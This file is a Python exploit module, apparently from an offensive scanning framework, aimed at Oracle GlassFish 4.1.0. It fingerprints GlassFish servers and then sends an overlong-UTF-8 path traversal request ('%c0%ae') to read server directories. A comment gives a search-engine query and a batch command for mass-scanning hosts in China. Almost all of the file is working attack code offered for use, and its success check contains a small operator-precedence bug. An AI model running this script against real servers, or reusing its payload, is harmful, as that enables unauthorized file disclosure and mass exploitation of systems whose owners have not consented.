# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 13:58

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import *
from core.request.asynchttp import *


# app="Oracle-Sun-GlassFish" && country="CN"
# python3 batch.py -m exploit.scripts.Glassfish.unauth_readfile -cs -fs "\"glassfish\" && country=\"CN\""

class Script(BaseScript):
    name = 'GlashFish'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/Conf/images/user.gif']
        # exec
        self.exec_path_list = ['/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/']
        # 相关信息
        self.info = 'version 4.1.0'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None:
                        await asyncio.sleep(2)
                        text = await response.text()
                        x_power_by = response.headers.get('X-Powered-By', '')
                        server = response.headers.get('Server', '')
                        if 'GlassFish' in text or 'GlassFish' in x_power_by or 'GlassFish' in server:
                            self.flag = True
                            gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                            return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'databases' in text or 'applications' in text or 'templates' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
